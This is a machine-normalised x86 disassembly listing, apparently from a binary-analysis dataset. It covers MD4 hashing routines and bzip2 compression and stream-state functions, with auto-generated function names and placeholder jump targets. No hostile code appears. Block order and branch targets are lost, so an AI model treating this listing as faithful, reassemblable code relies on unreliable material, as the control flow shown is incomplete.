add [ esi + 0x14 ] ecx
pop ebx
sub ebx eax
cmp edi ebx
jb r-xdata
inc [ esi + 0x14 ]
xor ebx ebx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
lea eax [ eax + esi + 0x18 ]
test ebx ebx
je r-xdata
pop edi
leave
retn
sub eax ecx
lea eax [ esi + 0x18 ]
push esi
call sub_1001ba73
lea eax [ ebx + 0x3f ]
pop ecx
cmp eax edi
jae r-xdata
sub eax ecx
mov dl [ ecx ]
mov [ eax + ecx ] dl
inc ecx
dec edi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] eax
mov dl [ ecx ]
mov [ eax + ecx ] dl
inc ecx
dec [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub edi ebx
lea ecx [ ebx + ecx ]
lea eax [ eax + esi + 0x18 ]
pop ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
lea eax [ eax + ecx - 0x3f ]
push esi
call sub_1001ba73
add [ ebp - 0x4 ] 0x40
add ebx 0x40
pop ecx
cmp [ ebp - 0x4 ] edi
jb r-xdata
sub_1001b9fe
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov esi ecx
lea edi [ esi + 0x10 ]
push 0x8
pop edx
mov eax edi
lea ecx [ ebp - 0xc ]
call sub_1001bedd
mov ecx [ edi ]
shr ecx 0x3
push 0x38
and ecx 0x3f
pop eax
cmp ecx eax
jb r-xdata
sub eax ecx
push rw-data
call sub_1001b959
lea eax [ ebp - 0xc ]
push eax
push 0x8
pop eax
call sub_1001b959
push 0x10
pop edx
mov eax esi
mov ecx ebx
call sub_1001bedd
push 0x58
push 0x0
push esi
call sub_10024b80
mov ecx [ ebp - 0x4 ]
add esp 0x14
pop edi
xor ecx ebp
pop esi
call sub_100242d7
leave
retn
push 0x78
pop eax
sub_1001ba73
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0x44
push ebx
push esi
push edi
push 0x10
add eax 0x2
lea edx [ ebp - 0x44 ]
pop esi
movzx edi [ eax + 0x1 ]
movzx ebx [ eax ]
shl edi 0x8
or edi ebx
movzx ebx [ eax - 0x1 ]
shl edi 0x8
or edi ebx
movzx ebx [ eax - 0x2 ]
shl edi 0x8
or edi ebx
mov [ edx ] edi
add edx 0x4
add eax 0x4
dec esi
jne r-xdata
mov edi [ ecx + 0x4 ]
mov esi [ ecx + 0x8 ]
mov edx [ ecx + 0xc ]
mov ebx esi
and ebx edi
mov eax edi
not eax
and eax edx
or eax ebx
add eax [ ebp - 0x44 ]
mov ebx edi
add eax [ ecx ]
rol eax 0x3
and ebx eax
mov ecx eax
not ecx
and ecx esi
or ecx ebx
add ecx [ ebp - 0x40 ]
add ecx edx
rol ecx 0x7
mov edx ecx
not edx
and edx edi
mov ebx ecx
and ebx eax
or edx ebx
add edx [ ebp - 0x3c ]
mov ebx ecx
add edx esi
rol edx 0xb
and ebx edx
mov esi edx
not esi
and esi eax
or esi ebx
add esi [ ebp - 0x38 ]
mov ebx edx
add esi edi
ror esi 0xd
and ebx esi
mov edi esi
not edi
and edi ecx
or edi ebx
add edi [ ebp - 0x34 ]
mov ebx esi
add edi eax
rol edi 0x3
and ebx edi
mov eax edi
not eax
and eax edx
or eax ebx
add eax [ ebp - 0x30 ]
add eax ecx
rol eax 0x7
mov ecx eax
not ecx
and ecx esi
mov ebx eax
and ebx edi
or ecx ebx
add ecx [ ebp - 0x2c ]
mov ebx eax
add ecx edx
rol ecx 0xb
mov edx ecx
not edx
and edx edi
and ebx ecx
or edx ebx
add edx [ ebp - 0x28 ]
mov ebx ecx
add edx esi
ror edx 0xd
mov esi edx
not esi
and esi eax
and ebx edx
or esi ebx
add esi [ ebp - 0x24 ]
mov ebx edx
add esi edi
rol esi 0x3
and ebx esi
mov edi esi
not edi
and edi ecx
or edi ebx
add edi [ ebp - 0x20 ]
add edi eax
rol edi 0x7
mov ebx edi
mov eax edi
and eax esi
not ebx
and ebx edx
or ebx eax
add ebx [ ebp - 0x1c ]
add ebx ecx
rol ebx 0xb
mov ecx edi
and ecx ebx
mov eax ebx
not eax
and eax esi
or eax ecx
add eax [ ebp - 0x18 ]
add eax edx
ror eax 0xd
mov ecx eax
not ecx
and ecx edi
mov edx ebx
and edx eax
or ecx edx
add ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
add ecx esi
rol ecx 0x3
and eax ecx
mov edx ecx
not edx
and edx ebx
or edx eax
add edx [ ebp - 0x10 ]
add edx edi
rol edx 0x7
mov eax edx
not eax
and eax [ ebp - 0x4 ]
mov esi edx
and esi ecx
or eax esi
add eax [ ebp - 0xc ]
mov edi edx
add eax ebx
rol eax 0xb
and edi eax
mov esi eax
not esi
and esi ecx
or esi edi
add esi [ ebp - 0x8 ]
mov edi eax
add esi [ ebp - 0x4 ]
ror esi 0xd
or edi esi
mov [ ebp - 0x4 ] esi
and edi edx
mov esi eax
and esi [ ebp - 0x4 ]
or edi esi
add edi [ ebp - 0x44 ]
lea ecx [ edi + ecx + 0x5a827999 ]
mov edi [ ebp - 0x4 ]
rol ecx 0x3
mov esi edi
or esi ecx
and edi ecx
mov ebx esi
and ebx eax
or ebx edi
add ebx [ ebp - 0x34 ]
lea edx [ ebx + edx + 0x5a827999 ]
rol edx 0x5
and esi edx
or esi edi
add esi [ ebp - 0x24 ]
lea eax [ esi + eax + 0x5a827999 ]
rol eax 0x9
mov esi eax
or esi ecx
and esi edx
mov edi eax
and edi ecx
or esi edi
add esi [ ebp - 0x14 ]
mov edi [ ebp - 0x4 ]
lea esi [ esi + edi + 0x5a827999 ]
rol esi 0xd
mov edi eax
or edi esi
and edi edx
mov ebx eax
and ebx esi
or edi ebx
add edi [ ebp - 0x40 ]
mov [ ebp - 0x4 ] esi
lea ecx [ edi + ecx + 0x5a827999 ]
rol ecx 0x3
or [ ebp - 0x4 ] ecx
mov edi [ ebp - 0x4 ]
mov ebx esi
and ebx ecx
and edi eax
or edi ebx
add edi [ ebp - 0x30 ]
lea edi [ edi + edx + 0x5a827999 ]
mov edx [ ebp - 0x4 ]
rol edi 0x5
and edx edi
or edx ebx
add edx [ ebp - 0x20 ]
lea eax [ edx + eax + 0x5a827999 ]
rol eax 0x9
mov edx eax
or edx ecx
and edx edi
mov ebx eax
and ebx ecx
or edx ebx
add edx [ ebp - 0x10 ]
mov ebx eax
lea edx [ edx + esi + 0x5a827999 ]
rol edx 0xd
mov esi eax
or esi edx
and esi edi
and ebx edx
or esi ebx
add esi [ ebp - 0x3c ]
mov [ ebp - 0x4 ] edx
lea ecx [ esi + ecx + 0x5a827999 ]
rol ecx 0x3
or [ ebp - 0x4 ] ecx
mov esi [ ebp - 0x4 ]
and esi eax
mov ebx edx
and ebx ecx
or esi ebx
add esi [ ebp - 0x2c ]
lea edi [ esi + edi + 0x5a827999 ]
mov esi [ ebp - 0x4 ]
rol edi 0x5
and esi edi
or esi ebx
add esi [ ebp - 0x1c ]
lea eax [ esi + eax + 0x5a827999 ]
rol eax 0x9
mov esi eax
or esi ecx
and esi edi
mov ebx eax
and ebx ecx
or esi ebx
add esi [ ebp - 0xc ]
mov ebx eax
lea edx [ esi + edx + 0x5a827999 ]
rol edx 0xd
and ebx edx
mov esi eax
or esi edx
and esi edi
or esi ebx
add esi [ ebp - 0x38 ]
mov [ ebp - 0x4 ] edx
lea ecx [ esi + ecx + 0x5a827999 ]
rol ecx 0x3
or [ ebp - 0x4 ] ecx
mov esi [ ebp - 0x4 ]
and esi eax
mov ebx edx
and ebx ecx
or esi ebx
add esi [ ebp - 0x28 ]
lea edi [ esi + edi + 0x5a827999 ]
mov esi [ ebp - 0x4 ]
rol edi 0x5
and esi edi
or esi ebx
add esi [ ebp - 0x18 ]
lea eax [ esi + eax + 0x5a827999 ]
rol eax 0x9
mov esi eax
or esi ecx
and esi edi
mov ebx eax
and ebx ecx
or esi ebx
add esi [ ebp - 0x8 ]
lea edx [ esi + edx + 0x5a827999 ]
rol edx 0xd
mov esi edi
xor esi eax
xor esi edx
add esi [ ebp - 0x44 ]
lea ecx [ esi + ecx + 0x6ed9eba1 ]
rol ecx 0x3
mov esi eax
xor esi edx
xor esi ecx
add esi [ ebp - 0x24 ]
lea edi [ esi + edi + 0x6ed9eba1 ]
rol edi 0x9
mov esi edi
xor esi edx
xor esi ecx
add esi [ ebp - 0x34 ]
lea eax [ esi + eax + 0x6ed9eba1 ]
rol eax 0xb
mov esi edi
xor esi eax
mov ebx esi
xor ebx ecx
add ebx [ ebp - 0x14 ]
lea edx [ ebx + edx + 0x6ed9eba1 ]
rol edx 0xf
xor esi edx
add esi [ ebp - 0x3c ]
lea ecx [ esi + ecx + 0x6ed9eba1 ]
rol ecx 0x3
mov esi eax
xor esi edx
xor esi ecx
add esi [ ebp - 0x1c ]
lea esi [ esi + edi + 0x6ed9eba1 ]
rol esi 0x9
mov edi esi
xor edi edx
xor edi ecx
add edi [ ebp - 0x2c ]
lea edi [ edi + eax + 0x6ed9eba1 ]
rol edi 0xb
mov ebx esi
xor ebx edi
mov eax ebx
xor eax ecx
add eax [ ebp - 0xc ]
lea eax [ eax + edx + 0x6ed9eba1 ]
rol eax 0xf
xor ebx eax
add ebx [ ebp - 0x40 ]
mov edx edi
xor edx eax
lea ecx [ ebx + ecx + 0x6ed9eba1 ]
rol ecx 0x3
xor edx ecx
add edx [ ebp - 0x20 ]
lea esi [ edx + esi + 0x6ed9eba1 ]
rol esi 0x9
mov edx esi
xor edx eax
xor edx ecx
add edx [ ebp - 0x30 ]
mov ebx esi
lea edi [ edx + edi + 0x6ed9eba1 ]
rol edi 0xb
xor ebx edi
mov edx ebx
xor edx ecx
add edx [ ebp - 0x10 ]
lea edx [ edx + eax + 0x6ed9eba1 ]
rol edx 0xf
xor ebx edx
add ebx [ ebp - 0x38 ]
mov eax edi
lea ecx [ ebx + ecx + 0x6ed9eba1 ]
rol ecx 0x3
xor eax edx
xor eax ecx
add eax [ ebp - 0x18 ]
lea esi [ eax + esi + 0x6ed9eba1 ]
rol esi 0x9
mov eax esi
xor eax edx
xor eax ecx
add eax [ ebp - 0x28 ]
lea edi [ eax + edi + 0x6ed9eba1 ]
mov eax [ ebp + 0x8 ]
mov ebx [ eax ]
add ebx ecx
mov [ eax ] ebx
rol edi 0xb
mov ebx esi
xor ebx edi
xor ebx ecx
add ebx [ ebp - 0x8 ]
lea ecx [ ebx + edx + 0x6ed9eba1 ]
rol ecx 0xf
add ecx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
add ecx edi
mov [ eax + 0x8 ] ecx
mov ecx [ eax + 0xc ]
pop edi
add ecx esi
pop esi
mov [ eax + 0xc ] ecx
pop ebx
leave
retn
sub_1001bedd
test edx edx
jbe r-xdata
retn
push esi
lea esi [ edx - 0x1 ]
shr esi 0x2
inc ecx
add eax 0x2
inc esi
mov dl [ eax - 0x2 ]
mov [ ecx - 0x1 ] dl
mov dl [ eax - 0x1 ]
mov [ ecx ] dl
mov dl [ eax ]
mov [ ecx + 0x1 ] dl
mov dl [ eax + 0x1 ]
mov [ ecx + 0x2 ] dl
add eax 0x4
add ecx 0x4
dec esi
jne r-xdata
pop esi
sub_1001bf0e
push r--data
push [ esp + 0x8 ]
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0x10
cmp [ esp + 0x4 ] 0x3ef
jne r-xdata
push 0x3
call sub_10027d48
int3
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
pop ecx
pop ecx
sub_1001bf77
or [ esi + 0x260 ] 0xffffffff
xor ecx ecx
push 0x100
lea eax [ esi + 0x58 ]
push ecx
push eax
mov [ esi + 0x44 ] ecx
mov [ esi + 0x4c ] ecx
mov [ esi + 0x50 ] ecx
call sub_10024b80
add esp 0xc
inc [ esi + 0x26c ]
retn
sub_1001bfb7
push ebx
xor ebx ebx
push esi
cmp edi ebx
je r-xdata
push 0xfffffffe
cmp [ edi + 0x24 ] ebx
jne r-xdata
cmp [ edi + 0x28 ] ebx
jne r-xdata
mov [ edi + 0x24 ] sub_1001bf54
push 0x1
push 0xd9b0
push [ edi + 0x2c ]
call [ edi + 0x24 ]
mov esi eax
add esp 0xc
cmp esi ebx
jne r-xdata
mov [ edi + 0x28 ] sub_1001bf65
push 0x1
mov [ esi ] edi
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
push 0x36ee80
push [ edi + 0x2c ]
call [ edi + 0x24 ]
push 0x1
mov [ esi + 0x10 ] eax
push 0x36ef08
push [ edi + 0x2c ]
call [ edi + 0x24 ]
push 0x1
mov [ esi + 0x14 ] eax
push 0x40004
push [ edi + 0x2c ]
call [ edi + 0x24 ]
mov ecx [ esi + 0x10 ]
add esp 0x24
mov [ esi + 0x18 ] eax
cmp ecx ebx
je r-xdata
push 0xfffffffd
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edx [ esi + 0x14 ]
cmp edx ebx
je r-xdata
pop eax
mov eax [ esi + 0x18 ]
cmp eax ebx
je r-xdata
push eax
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
cmp ecx ebx
je r-xdata
cmp eax ebx
je r-xdata
push esi
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
jmp r-xdata
push eax
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
push ecx
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
mov [ esi + 0x26c ] ebx
mov [ esi + 0x264 ] ebx
mov [ esi + 0x270 ] 0x9
mov [ esi + 0x48 ] 0xdbb8d
mov [ esi + 0x268 ] ebx
mov [ esi + 0x30 ] 0x1e
mov [ esi + 0x24 ] edx
mov [ esi + 0x28 ] ecx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x20 ] ecx
push 0x2
pop eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ edi + 0x20 ] esi
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x18 ] ebx
mov [ edi + 0x1c ] ebx
mov [ esi + 0x34 ] 0x100
mov [ esi + 0x38 ] ebx
call sub_1001bf77
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_1001c0ea
mov cl [ eax + 0x34 ]
push esi
xor esi esi
cmp [ eax + 0x38 ] esi
push edi
jle r-xdata
mov edx [ eax + 0x34 ]
mov [ eax + edx + 0x58 ] 0x1
mov edx [ eax + 0x38 ]
mov esi edx
dec esi
je r-xdata
movzx edi cl
push ebx
mov edx [ eax + 0x24 ]
mov esi [ eax + 0x44 ]
dec esi
je r-xdata
mov edx [ eax + 0x260 ]
mov ebx edx
shr ebx 0x18
xor ebx edi
shl edx 0x8
xor edx [ ebx * 4 + rw-data ]
inc esi
mov [ eax + 0x260 ] edx
cmp esi [ eax + 0x38 ]
jl r-xdata
pop ebx
mov edi [ eax + 0x24 ]
lea edx [ eax + 0x44 ]
mov esi [ edx ]
mov [ esi + edi ] cl
inc [ edx ]
mov esi [ edx ]
mov eax [ eax + 0x24 ]
mov [ esi + eax ] cl
inc [ edx ]
jmp r-xdata
dec esi
je r-xdata
pop edi
pop esi
retn
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
jmp r-xdata
mov [ edx + eax + 0x54 ] 0x1
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov dl [ eax + 0x38 ]
mov ecx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
sub dl 0x4
mov [ ecx + esi ] dl
jmp r-xdata
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
sub_1001c1c6
push ebp
mov ebp esp
push ecx
push ecx
cmp [ esi + 0x4 ] 0x2
mov eax [ esi + 0x44 ]
push ebx
push edi
mov [ ebp - 0x1 ] 0x0
jne r-xdata
cmp eax [ esi + 0x48 ]
jl r-xdata
jmp r-xdata
mov eax [ esi ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop ebx
leave
retn
cmp eax [ esi + 0x48 ]
jl r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ eax ]
movzx edi [ eax ]
mov eax [ esi + 0x34 ]
mov [ ebp - 0x1 ] 0x1
mov [ ebp - 0x8 ] edi
cmp edi eax
je r-xdata
mov eax [ eax ]
movzx edi [ eax ]
mov eax [ esi + 0x34 ]
mov [ ebp - 0x1 ] 0x1
mov [ ebp - 0x8 ] edi
cmp edi eax
je r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx 0xff
je r-xdata
cmp [ esi + 0x38 ] 0x1
jne r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx 0xff
je r-xdata
cmp [ esi + 0x38 ] 0x1
jne r-xdata
cmp eax 0x100
jae r-xdata
inc ecx
mov [ esi + 0x38 ] ecx
jmp r-xdata
cmp edi eax
jne r-xdata
mov dl al
lea ecx [ esi + 0x260 ]
mov eax [ ecx ]
mov edi eax
movzx ebx dl
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
mov [ ecx ] eax
mov eax [ esi + 0x34 ]
mov [ eax + esi + 0x58 ] 0x1
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x44 ]
mov [ eax + ecx ] dl
mov eax [ ebp - 0x8 ]
inc [ esi + 0x44 ]
mov [ esi + 0x34 ] eax
jmp r-xdata
cmp eax 0x100
jae r-xdata
inc ecx
mov [ esi + 0x38 ] ecx
jmp r-xdata
cmp edi eax
jne r-xdata
mov dl al
lea ecx [ esi + 0x260 ]
mov eax [ ecx ]
mov edi eax
movzx ebx dl
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
mov [ ecx ] eax
mov eax [ esi + 0x34 ]
mov [ eax + esi + 0x58 ] 0x1
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x44 ]
mov [ eax + ecx ] dl
mov eax [ ebp - 0x8 ]
inc [ esi + 0x44 ]
mov [ esi + 0x34 ] eax
jmp r-xdata
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] 0x1
mov eax esi
call sub_1001c0ea
mov eax [ esi ]
inc [ eax ]
mov eax [ esi ]
dec [ eax + 0x4 ]
mov eax [ esi ]
inc [ eax + 0x8 ]
mov eax [ esi ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] 0x1
mov eax esi
call sub_1001c0ea
mov eax [ esi ]
inc [ eax ]
mov eax [ esi ]
dec [ eax + 0x4 ]
mov eax [ esi ]
inc [ eax + 0x8 ]
mov eax [ esi ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec [ esi + 0xc ]
mov eax [ esi + 0x44 ]
inc [ eax + 0xc ]
mov eax [ esi + 0x44 ]
inc [ eax + 0xc ]
sub_1001c362
push ecx
push ebx
push ebp
push esi
mov esi [ eax + 0x20 ]
xor ebx ebx
push edi
mov [ esp + 0x12 ] bl
mov [ esp + 0x13 ] bl
cmp [ esi + 0x8 ] 0x2
jne r-xdata
xor cl cl
jmp r-xdata
xor edi edi
inc edi
cmp [ esi + 0x8 ] edi
jne r-xdata
call sub_1001c1c6
or [ esp + 0x12 ] al
cmp [ esi + 0x4 ] 0x2
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ esi + 0x44 ]
cmp eax [ esi + 0x48 ]
jl r-xdata
cmp [ esi + 0xc ] ebx
jne r-xdata
mov eax [ esi + 0x50 ]
cmp eax [ esi + 0x4c ]
jge r-xdata
mov eax [ esi + 0x50 ]
or [ esp + 0x13 ] cl
cmp eax [ esi + 0x4c ]
jl r-xdata
mov eax [ esi ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
push ebx
mov ebp 0x100
cmp [ esi + 0x34 ] ebp
jae r-xdata
mov edx [ esi + 0x2c ]
mov al [ eax + edx ]
mov ebp [ esi ]
mov ebp [ ebp + 0x10 ]
mov [ ebp ] al
mov eax [ esi ]
inc [ esi + 0x50 ]
dec [ eax + 0x14 ]
mov eax [ esi ]
inc [ eax + 0x10 ]
mov eax [ esi ]
inc [ eax + 0x18 ]
mov eax [ esi ]
mov cl 0x1
cmp [ eax + 0x18 ] ebx
jne r-xdata
cmp [ esp + 0x12 ] bl
jne r-xdata
cmp [ esi + 0x4 ] 0x4
jne r-xdata
cmp [ esi + 0x4 ] 0x4
mov [ esi + 0x34 ] ebp
sete al
movzx eax al
mov [ esi + 0x38 ] ebx
push eax
jmp r-xdata
mov eax esi
call sub_1001c0ea
inc [ eax + 0x1c ]
mov eax edi
cmp [ esp + 0x13 ] bl
jne r-xdata
call sub_1001bf77
cmp [ esi + 0x4 ] 0x3
mov [ esi + 0x8 ] 0x2
jne r-xdata
cmp [ esi + 0xc ] ebx
jne r-xdata
mov eax esi
call sub_1001ee9c
pop ecx
mov [ esi + 0x8 ] edi
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] ebx
jne r-xdata
mov eax esi
call sub_1001bfa2
test al al
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax esi
call sub_1001bfa2
test al al
jne r-xdata
sub_1001c489
push esi
test eax eax
jne r-xdata
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
push 0xfffffffe
mov edx [ esi ]
cmp edx eax
jne r-xdata
mov ecx [ esi + 0x4 ]
dec ecx
je r-xdata
or eax 0xffffffff
pop esi
retn
dec ecx
jne r-xdata
dec ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x4 ] 0x4
jmp r-xdata
dec ecx
je r-xdata
mov ecx [ esi + 0xc ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
xor eax eax
pop esi
retn
call sub_1001c362
test al al
je r-xdata
cmp [ esi + 0xc ] 0x0
ja r-xdata
push 0x3
jmp r-xdata
mov eax esi
call sub_1001bfa2
test al al
je r-xdata
pop eax
pop esi
retn
mov eax [ esi + 0x50 ]
cmp eax [ esi + 0x4c ]
jl r-xdata
mov [ esi + 0x4 ] 0x1
push 0x4
jmp r-xdata
sub_1001c500
test esi esi
jne r-xdata
push edi
mov edi [ esi + 0x20 ]
test edi edi
je r-xdata
push 0xfffffffe
pop eax
retn
push 0xfffffffe
pop eax
pop edi
retn
cmp [ edi ] esi
je r-xdata
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
mov edi [ edi + 0x18 ]
test edi edi
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
push [ esi + 0x20 ]
push [ esi + 0x2c ]
call [ esi + 0x28 ]
and [ esi + 0x20 ] 0x0
pop ecx
pop ecx
xor eax eax
pop edi
retn
push edi
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
sub_1001c55c
push ebx
xor ebx ebx
cmp esi ebx
jne r-xdata
cmp [ esi + 0x24 ] ebx
jne r-xdata
push 0xfffffffe
cmp [ esi + 0x28 ] ebx
jne r-xdata
mov [ esi + 0x24 ] sub_1001bf54
push 0x1
push 0xfa74
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0xc
cmp eax ebx
jne r-xdata
mov [ esi + 0x28 ] sub_1001bf65
mov [ eax ] esi
mov [ esi + 0x20 ] eax
mov [ eax + 0x20 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0xc64 ] ebx
mov [ eax + 0x4 ] 0xa
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ eax + 0x28 ] bl
mov [ eax + 0xc54 ] ebx
mov [ eax + 0xc50 ] ebx
mov [ eax + 0xc4c ] ebx
mov [ eax + 0x2c ] ebx
mov [ eax + 0x30 ] ebx
xor eax eax
pop ebx
retn
push 0xfffffffd
jmp r-xdata
pop eax
pop ebx
retn
sub_1001c5db
push ebp
mov ebp esp
sub esp 0x28
cmp [ ecx + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
mov eax [ ecx + 0xc60 ]
mov ebx [ ecx + 0xc4c ]
mov esi [ ecx + 0xc ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x14 ] eax
mov al [ ecx + 0x8 ]
mov [ ebp - 0x1 ] al
mov eax [ ecx + 0x440 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x3c ]
mov [ ebp - 0xc ] eax
mov eax [ ecx ]
mov edi [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x18 ] edi
mov edi [ ecx + 0x24 ]
mov [ ebp - 0x24 ] edi
mov edi [ ecx + 0xfa40 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x28 ] eax
inc edi
mov edx [ ecx ]
xor edi edi
cmp [ edx + 0x14 ] edi
je r-xdata
cmp [ ebp - 0x8 ] edi
jg r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ecx + 0xc ] edi
je r-xdata
mov al 0x1
je r-xdata
mov eax [ ecx ]
mov edi [ eax + 0x18 ]
mov [ ebp - 0x24 ] edi
sub edi [ ebp - 0x10 ]
add edi [ ebp - 0x28 ]
mov [ eax + 0x18 ] edi
mov eax [ ecx ]
mov edi [ ebp - 0x24 ]
cmp [ eax + 0x18 ] edi
jae r-xdata
cmp esi 0x1
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ecx + 0xfa40 ]
mov esi [ ecx + 0x440 ]
inc eax
mov [ ebp - 0x18 ] eax
cmp esi eax
je r-xdata
mov eax [ edx + 0x10 ]
mov dl [ ecx + 0x8 ]
mov [ eax ] dl
movzx ebx [ ecx + 0x8 ]
lea esi [ ecx + 0xc60 ]
mov edx [ esi ]
mov eax edx
shl edx 0x8
shr eax 0x18
xor eax ebx
xor edx [ eax * 4 + rw-data ]
dec [ ecx + 0xc ]
mov [ esi ] edx
mov edx [ ecx ]
inc [ edx + 0x10 ]
mov edx [ ecx ]
dec [ edx + 0x14 ]
mov edx [ ecx ]
inc [ edx + 0x18 ]
mov edx [ ecx ]
cmp [ edx + 0x18 ] edi
jne r-xdata
xor esi esi
jmp r-xdata
mov al [ ebp - 0xc ]
mov [ ebp - 0x1 ] al
mov eax [ ebp - 0x24 ]
imul eax eax 0x186a0
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x14 ]
mov [ ecx + 0xc60 ] eax
mov al [ ebp - 0x1 ]
mov [ ecx + 0x8 ] al
mov eax [ ebp - 0x8 ]
mov [ ecx + 0x440 ] eax
mov eax [ ebp - 0xc ]
mov [ ecx + 0x3c ] eax
mov eax [ ecx ]
mov [ ecx + 0x38 ] edx
mov edx [ ebp - 0x18 ]
mov [ ecx + 0xc ] esi
mov [ ecx + 0xc4c ] ebx
mov [ eax + 0x10 ] edx
mov eax [ ecx ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x14 ] ecx
inc [ eax + 0x1c ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx [ ebp - 0x18 ]
mov al [ ebp - 0x1 ]
mov [ ebx ] al
mov ebx [ ebp - 0x14 ]
movzx eax al
shr ebx 0x18
xor ebx eax
mov eax [ ebp - 0x14 ]
shl eax 0x8
xor eax [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x1c ]
dec esi
inc [ ebp - 0x18 ]
dec [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
jg r-xdata
inc [ edx + 0x1c ]
jmp r-xdata
mov edx [ ebx + edx * 4 ]
mov al dl
movzx eax al
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x20 ] eax
je r-xdata
xor esi esi
inc esi
mov esi [ ebp - 0x18 ]
mov al [ ebp - 0x1 ]
mov [ esi ] al
mov esi [ ebp - 0x14 ]
movzx eax al
shr esi 0x18
xor esi eax
mov eax [ ebp - 0x14 ]
shl eax 0x8
xor eax [ esi * 4 + rw-data ]
inc [ ebp - 0x18 ]
dec [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov al [ ecx + 0x3c ]
mov edx [ ecx + 0x38 ]
mov [ ecx + 0x8 ] al
mov eax [ ecx + 0x24 ]
imul eax eax 0x186a0
mov [ ecx + 0xc ] 0x1
mov [ ebp - 0x1c ] eax
cmp edx eax
jae r-xdata
